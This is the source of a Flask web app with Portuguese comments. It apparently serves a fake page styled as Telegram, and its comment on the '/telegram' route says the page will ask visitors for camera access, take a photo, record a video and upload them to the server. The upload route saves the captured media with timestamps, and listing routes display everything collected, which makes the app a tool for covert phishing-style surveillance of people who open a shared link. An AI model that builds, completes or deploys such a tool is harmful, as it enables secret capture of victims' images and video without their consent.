from flask import Flask, render_template, request, redirect, url_for, send_from_directory
import os
from datetime import datetime

app = Flask(__name__)

# Configuração das pastas de upload
if os.environ.get('RENDER'):
    # Caminho no Render.com
    UPLOAD_FOLDER = '/opt/render/project/src/uploads'
else:
    # Caminho local
    UPLOAD_FOLDER = 'uploads'

FOTOS_FOLDER = os.path.join(UPLOAD_FOLDER, 'fotos')
VIDEOS_FOLDER = os.path.join(UPLOAD_FOLDER, 'videos')

# Criar as pastas se não existirem
os.makedirs(FOTOS_FOLDER, exist_ok=True)
os.makedirs(VIDEOS_FOLDER, exist_ok=True)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # limite de 16MB por arquivo

# Rota para servir arquivos de upload
@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

@app.route('/')
def index():
    link_pagina_fake = url_for('pagina_fake')
    return render_template('index.html', link_pagina_fake=link_pagina_fake)

@app.route('/fake')
def pagina_fake():
    return render_template('pagina_fake.html')

@app.route('/telegram')
def telegram():
    # Esta página será aberta quando o link copiado for acessado.
    # Ela precisará conter o JavaScript para solicitar acesso à câmera,
    # tirar a foto, gravar o vídeo e enviar para o servidor.
    return render_template('telegram') # Criaremos este arquivo HTML

@app.route('/salvar_midia', methods=['POST'])
def salvar_midia():
    response = {'success': False, 'message': ''}
    
    try:
        if 'foto' in request.files:
            foto = request.files['foto']
            if foto.filename != '':
                nome_foto = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                foto.save(os.path.join(FOTOS_FOLDER, nome_foto))
                response['success'] = True
                
        if 'video' in request.files:
            video = request.files['video']
            if video.filename != '':
                nome_video = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
                video.save(os.path.join(VIDEOS_FOLDER, nome_video))
                response['success'] = True
                
        response['message'] = 'Mídia salva com sucesso!'
    except Exception as e:
        response['message'] = f'Erro ao salvar mídia: {str(e)}'
    
    return response

@app.route('/fotos')
def listar_fotos():
    try:
        fotos = os.listdir(FOTOS_FOLDER)
    except:
        fotos = []
    return render_template('fotos.html', fotos=fotos)

@app.route('/videos')
def listar_videos():
    try:
        videos = os.listdir(VIDEOS_FOLDER)
    except:
        videos = []
    return render_template('videos.html', videos=videos)

# Necessário para Render
application = app

if __name__ == '__main__':
    app.run(debug=True)
